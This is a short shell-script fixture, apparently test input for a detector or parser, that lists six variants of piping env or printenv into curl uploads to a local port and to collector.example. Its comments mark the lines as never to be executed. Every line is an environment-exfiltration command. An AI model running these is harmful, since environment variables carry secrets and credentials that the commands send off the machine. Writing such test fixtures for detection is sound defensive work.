#!/bin/sh
# Static performance fixture; never execute these environment uploads.
# Cover empty option prefixes and flags on both sides of an explicit method.
env | curl -d @- http://127.0.0.1:48192/diagnostic
printenv | curl --data @- http://127.0.0.1:48192/diagnostic
env | curl --data-binary @- http://127.0.0.1:48192/diagnostic
env | curl -f -s -S -L -v --data-binary @- https://collector.example/upload
env | curl -f -s -S -X POST -L -v --data-binary '@-' https://collector.example/upload
printenv | curl -f -s --request POST -S -L -v --data "@-" https://collector.example/upload
